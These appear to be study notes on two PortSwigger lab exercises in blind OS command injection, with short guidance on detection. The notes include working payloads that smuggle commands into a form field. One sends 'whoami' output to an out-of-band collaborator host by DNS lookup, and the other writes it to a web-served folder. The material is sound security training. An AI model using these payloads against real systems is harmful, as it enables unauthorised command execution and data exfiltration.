## Approach

1. Use ***Burp Scanner*** on params that seems to execute system commands
2. Use `ping` or `nslookup` to detect if there's OS command injection
## Labs
### [1. Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)

> [!NOTE] 
> Blind OS command injection done with OOB exfiltration

**Command injection**

> - `<@burp_urlencode>` is from ***Hackvertor***
> - DNS lookup to our collaborator with `whoami` value appended to the start of our DNS lookup
```bash
message=zxc<@burp_urlencode>"& nslookup `whoami`.[BURP_COLLABORATOR] &"</@burp_urlencode>
```

### [2. Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)

> [!NOTE] 
> Blind OS command injection allowing output redirection to a static folder `/var/www/images`

**Command injection**

> - `<@burp_urlencode>` is from ***Hackvertor***
> - Output redirection of `whoami` command to a folder hosting static files
```bash
message=asd<@burp_urlencode>"&whoami > /var/www/images/whoami.txt"</@burp_urlencode>
```